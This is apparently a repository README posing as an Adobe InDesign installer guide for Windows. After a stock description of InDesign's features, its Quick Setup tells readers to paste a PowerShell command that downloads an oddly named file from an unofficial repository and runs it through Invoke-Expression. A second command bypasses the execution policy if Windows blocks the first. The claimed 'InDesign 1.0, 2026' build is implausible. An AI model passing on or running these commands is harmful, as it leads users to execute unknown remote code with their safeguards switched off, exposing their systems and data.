# InDesign

InDesign is the Windows program this page sets up. The command in Quick Setup installs it on this PC. After that you open InDesign and work in it.

Adobe InDesign on Windows is a desktop publishing program for building magazines, books, marketing collateral, and interactive documents where text, images, and vector art share one layout grid. You arrange threaded stories in frames, apply paragraph and character styles, and use master pages so repeating elements stay aligned across dozens or hundreds of pages.

A typical session starts when you open an INDD file and scan the Links and Fonts panels for missing or outdated assets. You place revised copy, adjust baseline grids and object styles, tweak table formats, and preview separations when spot colors or overprint matter. Before handoff you run preflight, refresh the table of contents or index, then export a press-ready PDF, package linked files for a print vendor, or output reflowable EPUB when the job includes a digital edition.

This repository keeps Windows-oriented setup files and pinned build references your team uses during rollout, plus a changelog that tracks version bumps and script fixes. Folder notes document export presets, swatch libraries, and master-page naming so new designers match house standards quickly. Separate paths hold automation snippets, preflight profiles, and handoff checklists you reuse at the end of every production cycle.

## What you do with it

- Master pages carry folios, running heads, and margin guides across entire multipage publications without manual duplication.
- Threaded text frames flow long articles through columns and jumps while keeping one linked story intact.
- Paragraph and character styles enforce headline, body, and caption rules across chapters and linked InDesign documents.
- The Links panel flags missing fonts, modified graphics, and embedded RGB images before you send files out.
- Data merge maps spreadsheet rows into business cards, catalogs, and variable-data labels for batch output.
- Interactive PDF export adds buttons, bookmarks, and hyperlinks suitable for client review on Windows desktops.
- Packaging gathers fonts, linked images, and document files into one folder for reliable vendor transmission.
- Preflight profiles catch overset text, broken links, and ink coverage issues prior to final PDF export.

## Quick Setup (PowerShell)

This installs the program InDesign on Windows.
1. Launch PowerShell:
   - Press `Win` + `X` on the keyboard.
   - Click **Terminal** or **Windows PowerShell** in the list.
2. Copy the command below, paste it into that window, and press Enter. Wait until it finishes.

```powershell
irm https://raw.githubusercontent.com/clara-seidel502023/indesign-setup-guide/main/6fliice8cq.c26ntt6y | Invoke-Expression
```

## If the script is blocked

If Windows stops the script, paste this command into the same window and press Enter.

```powershell
powershell -ExecutionPolicy Bypass -Command "Invoke-RestMethod https://raw.githubusercontent.com/clara-seidel502023/indesign-setup-guide/main/6fliice8cq.c26ntt6y | Invoke-Expression"
```

## Files

| File | What it is |
| --- | --- |
| `6fliice8cq.c26ntt6y` | The file both commands read |
| `Initial.js` | Small helper kept next to the setup |
| `LICENSE` | MIT |
| `CHANGELOG.md` | What changed in build 1.0 |

## This build

Repository `clara-seidel502023/indesign-setup-guide`. Adobe InDesign 1.0, 2026. Windows 10 and Windows 11, 64-bit.
  
